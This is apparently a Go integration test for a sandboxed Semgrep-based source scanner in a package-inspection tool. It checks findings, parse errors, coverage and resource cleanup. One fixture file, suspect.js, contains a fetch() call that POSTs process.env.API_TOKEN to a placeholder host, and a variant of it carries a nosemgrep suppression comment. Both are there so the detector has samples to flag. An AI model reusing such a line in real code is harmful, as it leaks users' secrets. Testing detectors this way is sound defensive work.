//go:build linux && realcorpus

package sandbox

import (
	"context"
	"encoding/json"
	"os"
	"testing"
	"time"

	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/core/ports"
	"github.com/rahoney/heliopause/internal/hosttool"
	"github.com/rahoney/heliopause/internal/inspection/content"
	"github.com/rahoney/heliopause/internal/runtimeidentity"
)

type recordedSourceAnalysis func(context.Context, ports.SourceAnalysisInput) (ports.SourceAnalysisOutput, error)

func (f recordedSourceAnalysis) Analyze(ctx context.Context, input ports.SourceAnalysisInput) (ports.SourceAnalysisOutput, error) {
	return f(ctx, input)
}

// This is the fixed source parser's runtime qualification, not an artifact
// safety verdict or the Inspection/Policy consumer acceptance.
func TestSourceAnalysisActualTracedParser(t *testing.T) {
	if os.Getenv("HELOX_SOURCE_ANALYSIS_INTEGRATION") != "1" {
		t.Skip("requires explicit fixed supply and isolated current observer runtime")
	}
	supervisor := integrationObserverSupervisor(t)
	defer func() {
		if err := supervisor.Close(); err != nil {
			t.Error(err)
		}
	}()
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	executor, err := hosttool.NewSystem(ctx)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := executor.Close(); err != nil {
			t.Error(err)
		}
	}()
	for _, partial := range []bool{false, true} {
		name := "clean"
		if partial {
			name = "partial-with-ignored-signal"
		}
		if !t.Run(name, func(t *testing.T) {
			resources := &pipxActualResources{ObservationResourceClient: integrationObservationResourceAdapter(t)}
			analyzer, err := NewSourceAnalyzer(executor, supervisor.Observer(), resources)
			if err != nil {
				t.Fatal(err)
			}
			input := sourceAnalysisInputFixture(t)
			input.Files = []ports.SourceAnalysisFile{
				{Path: "plain.js", Language: "javascript", Body: []byte("const answer = 42;\n")},
				{Path: "plain.ts", Language: "typescript", Body: []byte("const answer: number = 42;\n")},
				{Path: "plain.py", Language: "python", Body: []byte("answer = 42\n")},
				{Path: "plain.go", Language: "go", Body: []byte("package plain\nconst Answer = 42\n")},
				{Path: "plain.rs", Language: "rust", Body: []byte("pub const ANSWER: i32 = 42;\n")},
				{Path: "plain.tf", Language: "hcl", Body: []byte("locals { answer = 42 }\n")},
				{Path: "suspect.js", Language: "javascript", Body: []byte("const label = '한글 α'; fetch('https://example.invalid', {method: 'POST', body: process.env.API_TOKEN});\n")},
			}
			if partial {
				input.Files[6].Body = []byte("// nosemgrep: haa-s04-js-credential-body\nconst label = '한글 α'; fetch('https://example.invalid', {method: 'POST', body: process.env.API_TOKEN});\n")
				input.Files = append(input.Files, ports.SourceAnalysisFile{Path: "parse-invalid.py", Language: "python", Body: []byte("def bad(:\n    pass\n")}, ports.SourceAnalysisFile{Path: "parse-partial.js", Language: "javascript", Body: []byte("const x = ;\n")})
			}
			if !partial {
				input.Files = input.Files[:6]
			}
			var result ports.SourceAnalysisOutput
			var runErr error
			runtime := recordedSourceAnalysis(func(ctx context.Context, in ports.SourceAnalysisInput) (ports.SourceAnalysisOutput, error) {
				result, runErr = analyzer.Analyze(ctx, in)
				return result, runErr
			})
			report, reportErr := content.InspectSources(ctx, runtime, input.Artifact, input.Files)
			t.Logf("profile=%s status=%s observer_reason=%s runtime_error=%v report_error=%v", sourceAnalysisProfile, result.Runtime.Status(), integrationObserverFaultReason(supervisor), runErr, reportErr)
			if runErr != nil || result.Runtime.Status() != domain.SandboxCompleted || result.Output == nil {
				t.Fatal("traced source parser did not complete")
			}
			var output struct {
				Version string            `json:"version"`
				Results []json.RawMessage `json:"results"`
				Errors  []json.RawMessage `json:"errors"`
				Paths   struct {
					Scanned []string `json:"scanned"`
				} `json:"paths"`
				Skipped []json.RawMessage `json:"skipped_rules"`
			}
			if err := json.Unmarshal(result.Output.Stdout(), &output); err != nil {
				t.Fatal(err)
			}
			if reportErr != nil {
				var top map[string]json.RawMessage
				_ = json.Unmarshal(result.Output.Stdout(), &top)
				keys := []string{}
				for key := range top {
					keys = append(keys, key)
				}
				t.Logf("source report top keys=%v time=%s", keys, top["time"])
				t.Logf("source report version=%s engine=%s rules_by_engine=%s paths=%s controller_targets=%v interfile=%s profiling=%s", top["version"], top["engine_requested"], top["rules_by_engine"], top["paths"], result.Targets, top["interfile_languages_used"], top["profiling_results"])
				for _, raw := range output.Results {
					var match struct {
						ID    string                     `json:"check_id"`
						Path  string                     `json:"path"`
						Start json.RawMessage            `json:"start"`
						End   json.RawMessage            `json:"end"`
						Extra map[string]json.RawMessage `json:"extra"`
					}
					if json.Unmarshal(raw, &match) == nil {
						extraKeys := []string{}
						for key := range match.Extra {
							extraKeys = append(extraKeys, key)
						}
						t.Logf("source match id=%s path=%s start=%s end=%s extra_keys=%v", match.ID, match.Path, match.Start, match.End, extraKeys)
					}
				}
				t.Fatal("strict source interpretation failed", reportErr)
			}
			wantFindings := 0
			if partial {
				wantFindings = 1
			}
			if output.Version != runtimeidentity.SelectedSemgrepSupply().Version || len(output.Paths.Scanned) != len(input.Files) || len(output.Results) != wantFindings || len(output.Skipped) != 0 || len(result.Targets) != len(input.Files) {
				t.Fatal("fixed parser output inventory differs")
			}
			if (!partial && len(output.Errors) != 0) || (partial && len(output.Errors) < 2) {
				t.Fatal("parse error coverage differs", len(output.Errors))
			}
			checks := report.Executions()
			wantCoverage := domain.ExecutionCompleted
			if partial {
				wantCoverage = domain.ExecutionIncomplete
			}
			if len(checks) != 2 || checks[0].Status() != wantCoverage || checks[1].Status() != domain.ExecutionCompleted || len(report.Findings()) != wantFindings || (partial && report.Findings()[0].Code() != "M13_SOURCE_REVIEW") {
				t.Fatal("source findings or required coverage lost")
			}
			for _, path := range output.Paths.Scanned {
				if result.Targets[path] == "" {
					t.Fatal("opaque source path lacks controller binding", path)
				}
			}
			if partial {
				var match struct {
					Extra struct {
						Ignored bool `json:"is_ignored"`
					} `json:"extra"`
				}
				if json.Unmarshal(output.Results[0], &match) != nil || !match.Extra.Ignored {
					t.Fatal("ignored source signal fixture was not exercised")
				}
			}
			resources.mu.Lock()
			creates, registers, closes, cpu := resources.creates, resources.registers, resources.closes, resources.cpu
			resources.mu.Unlock()
			if creates != 1 || registers != 1 || closes != 1 || cpu == 0 {
				t.Fatal("resource lifetime was not closed exactly once")
			}
			t.Logf("source_analysis_complete case=%s scanned=%d findings=%d errors=%d skipped=0 coverage=%s creates=%d registers=%d closes=%d cpu_usec=%d", name, len(output.Paths.Scanned), len(output.Results), len(output.Errors), wantCoverage, creates, registers, closes, cpu)
		}) {
			return
		}
	}
}
